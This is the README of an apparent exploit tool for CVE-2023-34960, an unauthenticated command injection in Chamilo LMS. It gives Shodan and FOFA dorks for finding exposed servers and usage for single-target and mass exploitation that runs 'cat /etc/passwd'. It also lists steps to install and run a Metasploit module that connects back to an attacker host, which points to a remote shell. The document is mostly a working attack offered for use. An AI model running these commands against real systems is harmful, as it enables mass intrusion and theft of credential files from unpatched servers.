# CVE-2023-34960
![](https://img.shields.io/static/v1?label=Product&message=Chamilo&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=v1.11.*%20up%20to%20v1.11.18&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Unauthenticated%20Command%20injection&color=red)


- [Nuclei Template](https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/cves/2023/CVE-2023-34960.yaml)
```
nuclei -t CVE-2023-34960.yaml -vv
```

- Shodan dork:
```
http.component:"Chamilo"
```
- FOFA dork:
```
body="content=\"Chamilo 1"
```
## Install
```
pip install -r requirements.txt
```
## Usage
```
usage: exploit.py [-h] [-u URL] [-f FILENAME] [-c COMMAND] [-t THREADS]
                  [-o OUTPUT]

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     URL address (without 'http://' prefix)
  -f FILENAME, --filename FILENAME
                        File containing URLs
  -c COMMAND, --command COMMAND
                        Command to execute (optional)
  -t THREADS, --threads THREADS
                        Maximum number of concurrent threads
  -o OUTPUT, --output OUTPUT
                        Output file for saving the results
# Single scan.
python3 exploit.py -u target_IP -c 'cat /etc/passwd'

# Mass scan.
python3 exploit.py -f list_ip.txt -c 'cat /etc/passwd'
```
## Metasploit Framework
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/Chamilo CVE-2023-34960/chamilo_unauth_rce_cve_2023_34960.rb
```
```
cp chamilo_unauth_rce_cve_2023_34960.rb /usr/share/metasploit-framework/modules/exploits/linux/http/
```
```
msfdb reinit; msfconsole -q
```
```
use exploitsexploits/linux/http/chamilo_unauth_rce_cve_2023_34960.rb
```
```
set rhosts target_IP
```
```
set lhost attacker_IP
```
```
run
```
